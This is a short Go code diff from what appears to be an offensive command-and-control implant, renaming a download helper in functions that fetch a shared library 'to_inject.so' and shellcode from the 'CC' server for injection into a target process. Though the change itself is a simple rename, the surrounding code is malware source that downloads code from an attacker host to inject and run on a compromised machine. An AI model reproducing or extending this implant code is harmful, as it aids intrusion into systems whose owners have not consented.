@@ -87,7 +87,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 	if !sysinfo.HasRoot() {
 		path = fmt.Sprintf("%s/%s", common.RuntimeConfig.UtilsPath, common.NameTheLibrary())
 	}
-	_, err = c2transport.SmartDownload("", "to_inject.so", path, checksum)
+	_, err = c2transport.FetchFile("", "to_inject.so", path, checksum)
 	if err != nil {
 		err = fmt.Errorf("failed to download to_inject.so from CC: %v", err)
 	}
@@ -96,7 +96,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 
 // prepare the shellcode
 func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
-	sc, err := c2transport.SmartDownload("", "shellcode.txt", "", checksum)
+	sc, err := c2transport.FetchFile("", "shellcode.txt", "", checksum)
 	if err != nil {
 		logging.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
